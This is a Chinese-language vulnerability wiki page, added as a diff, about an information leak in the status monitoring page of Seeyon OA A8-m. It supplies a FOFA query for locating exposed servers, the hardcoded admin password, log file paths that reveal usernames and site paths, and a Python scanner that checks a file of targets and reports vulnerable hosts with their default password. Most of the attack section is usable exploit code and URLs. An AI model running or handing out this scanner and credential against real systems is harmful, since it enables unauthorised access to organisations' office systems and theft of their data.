@@ -1,0 +1,81 @@
+<h1 id="致远OA-A8-状态监控页面信息泄露"><a href="#致远OA-A8-状态监控页面信息泄露" class="headerlink" title="致远OA A8 状态监控页面信息泄露"></a>致远OA A8 状态监控页面信息泄露</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>致远OA A8-m 存在状态监控页面信息泄露，攻击者可以从其中获取网站路径和用户名等敏感信息进一步攻击</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>致远OA A8-m</p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>title=”A8-m”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问监控页面</p>
+<pre><code>http://xxx.xxx.xxx.xx/seeyon/management/status.jsp
+</code></pre>
+<p><img src="http://wikioss.peiqi.tech/vuln/zhiyuan-32.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p>后台密码为 <strong>WLCCYBD@SEEYON</strong></p>
+<p>登录后通过如下url获得一些敏感信息</p>
+<pre><code>/seeyon/management/status.jsp
+/seeyon/logs/login.log
+/seeyon/logs/v3x.log
+</code></pre>
+<p><img src="http://wikioss.peiqi.tech/vuln/zhiyuan-33.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p><img src="http://wikioss.peiqi.tech/vuln/zhiyuan-34.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<p><img src="http://wikioss.peiqi.tech/vuln/zhiyuan-35.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<h2 id="漏洞利用POC"><a href="#漏洞利用POC" class="headerlink" title="漏洞利用POC"></a>漏洞利用POC</h2><blockquote>
+<p>[!NOTE]</p>
+<p>多个目标</p>
+</blockquote>
+<pre><code class="python">import requests
+import sys
+import random
+import re
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+def title():
+    print(&#39;+------------------------------------------&#39;)
+    print(&#39;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#39;)
+    print(&#39;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#39;)
+    print(&#39;+  \033[34m公众号  : PeiQi文库                                                   \033[0m&#39;)
+    print(&#39;+  \033[34mVersion: 致远OA A6                                                  \033[0m&#39;)
+    print(&#39;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#39;)
+    print(&#39;+  \033[36mFile         &gt;&gt;&gt; ip.txt                                             \033[0m&#39;)
+    print(&#39;+------------------------------------------&#39;)
+
+def POC_1(target_url):
+    vuln_url = target_url + &quot;/seeyon/management/index.jsp&quot;
+    headers = {
+        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;,
+    }
+    try:
+        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+        if response.status_code == 200 and &quot;Password&quot; in response.text:
+            print(&quot;\033[32m[o] 目标 {} 存在后台监控地址{}，默认密码为: WLCCYBD@SEEYON\033[0m&quot;.format(target_url, vuln_url))
+        else:
+            print(&quot;\033[31m[x] 目标 {}不存在漏洞 \033[0m&quot;.format(target_url))
+    except Exception as e:
+        print(&quot;\033[31m[x] 目标 {} 请求失败 \033[0m&quot;.format(target_url))
+
+def Scan(file_name):
+    with open(file_name, &quot;r&quot;, encoding=&#39;utf8&#39;) as scan_url:
+        for url in scan_url:
+            if url[:4] != &quot;http&quot;:
+                url = &quot;http://&quot; + url
+            url = url.strip(&#39;\n&#39;)
+            try:
+                POC_1(url)
+
+            except Exception as e:
+                print(&quot;\033[31m[x] 请求报错 \033[0m&quot;.format(e))
+                continue
+
+if __name__ == &#39;__main__&#39;:
+    title()
+    file_name  = str(input(&quot;\033[35mPlease input Attack File\nFile &gt;&gt;&gt; \033[0m&quot;))
+    Scan(file_name)
+</code></pre>
+<p><img src="http://wikioss.peiqi.tech/vuln/zhiyuan-36.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
+<h2 id="Goby-amp-POC"><a href="#Goby-amp-POC" class="headerlink" title="Goby &amp; POC"></a>Goby &amp; POC</h2><blockquote>
+<p>[!NOTE]</p>
+<p>Seeyon OA A8-m Information leakage</p>
+</blockquote>
+<p><img src="http://wikioss.peiqi.tech/vuln/zhiyuan-43.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10"></p>
